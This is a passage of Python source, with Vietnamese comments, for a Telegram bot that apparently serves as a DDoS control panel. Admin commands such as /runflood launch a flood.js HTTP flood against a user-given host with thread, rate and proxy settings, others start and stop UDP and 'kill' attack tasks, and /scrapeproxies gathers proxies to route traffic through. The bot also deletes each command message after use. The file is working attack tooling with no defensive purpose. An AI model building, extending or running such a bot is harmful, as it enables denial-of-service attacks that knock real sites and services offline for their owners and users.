        cmd = ['node', 'flood.js', 'GET', host, time, threads, rate, proxyfile, '--query', '1', '--cookie', 'uh=good', '--http', '2', '--debug', '--full', '--winter']
        logger.info(f"Đang chạy flood.js với các tham số: {cmd}")

        # Cập nhật thông báo thành công
        bot.edit_message_text(
            f"✅ Lệnh /runflood đã được nhận!\n"
            f"🎯 Host: {host}\n"
            f"⏱️ Time: {time}s\n"
            f"🧵 Threads: {threads}\n"
            f"📊 Rate: {rate}\n"
            f"📁 Proxy: {proxyfile}\n\n"
            f"🔄 Đang khởi động tác vụ...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )

        # Chạy script flood.js bất đồng bộ
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'flood', message)

    except Exception as e:
        logger.error(f"Đã xảy ra lỗi trong /runflood: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runflood: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runflood: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['stopovh'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_stopovh(message):
    # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
    processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /stopovh...")
    
    # Xóa tin nhắn lệnh sau khi đã gửi thông báo
    delete_message_immediately(message.chat.id, message.message_id)
    
    # Cập nhật thông báo
    bot.edit_message_text(
        "✅ Lệnh /stopovh đã được nhận!\n🔄 Đang dừng tác vụ udpovh...",
        chat_id=message.chat.id,
        message_id=processing_msg.message_id
    )
    
    stop_subprocess(message.from_user.id, message.chat.id, 'udpovh', message)

@bot.message_handler(commands=['statusovh'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_statusovh(message):
    # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
    processing_msg = bot.reply_to(message, "🔄 Đang kiểm tra trạng thái...")
    
    # Xóa tin nhắn lệnh sau khi đã gửi thông báo
    delete_message_immediately(message.chat.id, message.message_id)
    
    key = (message.from_user.id, message.chat.id, 'udpovh')
    proc = running_tasks.get(key)
    if proc and proc.poll() is None:
        bot.edit_message_text(
            f"✅ Tác vụ `udpovh` đang chạy (PID {proc.pid}).",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
    else:
        bot.edit_message_text(
            "ℹ️ Tác vụ `udpovh` hiện không chạy.",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
    auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)

@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies', 'stopflood'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_stop_task(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh dừng tác vụ...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        cmd = message.text.lower()
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        task_name = ""
        if cmd.startswith('/stopkill'):
            task_name = "killjs"
            stop_subprocess(user_id, chat_id, 'killjs', message)
        elif cmd.startswith('/stopudp'):
            task_name = "udp"
            stop_subprocess(user_id, chat_id, 'udp', message)
        elif cmd.startswith('/stopproxies'):
            task_name = "scrapeproxies"
            stop_subprocess(user_id, chat_id, 'scrapeproxies', message)
        elif cmd.startswith('/stopflood'):
            task_name = "flood"
            stop_subprocess(user_id, chat_id, 'flood', message)
        
        # Cập nhật thông báo
        bot.edit_message_text(
            f"✅ Lệnh dừng tác vụ `{task_name}` đã được nhận!\n🔄 Đang dừng tác vụ...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
    except Exception as e:
        logger.error(f"Error stopping task: {e}")
        try:
            bot.edit_message_text(f"❌ Lỗi khi dừng tác vụ: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except:
            sent = bot.reply_to(message, f"❌ Lỗi khi dừng tác vụ: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies', 'statusflood'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_status_task(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang kiểm tra trạng thái...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        cmd = message.text.lower()
        user_id = message.from_user.id
        chat_id = message.chat.id
        if 'kill' in cmd:
            task_key = 'killjs'
        elif 'udp' in cmd:
            task_key = 'udp'
        elif 'proxies' in cmd:
            task_key = 'scrapeproxies'
        elif 'flood' in cmd:
            task_key = 'flood'
        else:
            bot.edit_message_text(
                "❌ Lệnh không hợp lệ.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            return
        key = (user_id, chat_id, task_key)
        proc = running_tasks.get(key)
        if proc and proc.poll() is None:
            bot.edit_message_text(
                f"✅ Tác vụ `{task_key}` đang chạy (PID {proc.pid}).",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
        else:
            bot.edit_message_text(
                f"ℹ️ Tác vụ `{task_key}` hiện không chạy.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
    except Exception as e:
        logger.error(f"Error checking task status: {e}")
        try:
            bot.edit_message_text(f"❌ Lỗi khi kiểm tra trạng thái tác vụ: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except:
            sent = bot.reply_to(message, f"❌ Lỗi khi kiểm tra trạng thái tác vụ: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['scrapeproxies'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_scrapeproxies(message):
    # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
    processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /scrapeproxies...")
    
    # Xóa tin nhắn lệnh sau khi đã gửi thông báo
    delete_message_immediately(message.chat.id, message.message_id)
    
    user_id = message.from_user.id
    chat_id = message.chat.id
    task_key = "scrapeproxies"
    key = (user_id, chat_id, task_key)
    proc = running_tasks.get(key)
    if proc and proc.poll() is None:
        bot.edit_message_text("❌ Tác vụ thu thập proxy đang chạy rồi. Vui lòng đợi hoặc dừng rồi chạy lại.", 
                            chat_id=message.chat.id, 
                            message_id=processing_msg.message_id)
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
        return
    try:
        # Use different approach for Windows vs Unix
        if os.name == 'nt':  # Windows
            proc = subprocess.Popen(
                ['python', 'scrape.py'],  # Use 'python' instead of 'python3' on Windows
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
            )
        else:  # Unix/Linux
            proc = subprocess.Popen(
                ['python3', 'scrape.py'],  # Đổi tên file nếu bạn đặt khác
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid
            )
        running_tasks[key] = proc
        
        # Cập nhật thông báo thành công
        bot.edit_message_text(
            "✅ Lệnh /scrapeproxies đã được nhận!\n"
            "🔄 Đang bắt đầu thu thập proxy từ các nguồn...\n"
            "⏳ Quá trình này có thể mất vài phút.\n"
            "📁 Kết quả sẽ được lưu vào file proxies.txt",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=30)
    except Exception as e:
        logger.error(f"Error starting scrapeproxies task: {e}")
        bot.edit_message_text(f"❌ Lỗi khi bắt đầu thu thập proxy: {str(e)}", 
                            chat_id=message.chat.id, 
                            message_id=processing_msg.message_id)
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)

# ========== Handler cho tin nhắn không được nhận diện ==========

@bot.message_handler(func=lambda message: True)
@ignore_old_messages
@not_banned
def handle_unknown_message(message):
    """Xử lý các tin nhắn không được nhận diện"""
    try:
        # Kiểm tra nếu là lệnh không tồn tại
        if message.text.startswith('/'):
            sent = bot.reply_to(message, 
                f"❓ Lệnh `{message.text.split()[0]}` không tồn tại hoặc bạn không có quyền sử dụng.\n"
                f"💡 Sử dụng /help để xem danh sách lệnh có sẵn.")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        else:
            # Tin nhắn thường
            sent = bot.reply_to(message, 
                "💬 Bot chỉ hỗ trợ các lệnh. Sử dụng /help để xem danh sách lệnh có sẵn.")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=8)
    except Exception as e:
        logger.error(f"Error handling unknown message: {e}")

# ========== Main chạy bot ==========

def main():
    bot.start_time = datetime.now()
    logger.info(f"🤖 Bot khởi động với token bắt đầu bằng: {Config.TOKEN[:10]}")
    
    # Kiểm tra dependencies
    check_dependencies()
    
    # Kiểm tra token hợp lệ
    try:
        bot_info = bot.get_me()
        logger.info(f"✅ Bot connected successfully: @{bot_info.username}")
    except Exception as e:
        logger.error(f"❌ Invalid bot token or connection failed: {e}")
        sys.exit(1)
    
    retry_count = 0
    max_retries = 5
    
    while retry_count < max_retries:
        try:
            logger.info("🔄 Starting bot polling...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
            break  # Nếu polling thành công, thoát khỏi vòng lặp
        except ApiException as api_e:
            retry_count += 1
            logger.error(f"❌ Telegram API Error (attempt {retry_count}/{max_retries}): {api_e}")
            if retry_count >= max_retries:
                logger.error("❌ Max retries reached. Exiting...")
                break
            time.sleep(Config.RETRY_DELAY)
        except KeyboardInterrupt:
            logger.info("🛑 Bot stopped by user (KeyboardInterrupt)")
            break
        except Exception as e:
            retry_count += 1
            logger.error(f"❌ Unexpected error (attempt {retry_count}/{max_retries}): {e}")
            if retry_count >= max_retries:
                logger.error("❌ Max retries reached. Exiting...")
                break
            time.sleep(Config.RETRY_DELAY)
    
    logger.info("👋 Bot shutdown complete")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logger.info("🛑 Bot stopped by user (KeyboardInterrupt)")
    except Exception as e:
        logger.error(f"❌ Fatal error: {e}")
    finally:
        # Cleanup
        try:
            executor.shutdown(wait=False)
            logger.info("🧹 Cleanup completed")
        except:
            pass
        sys.exit(0)
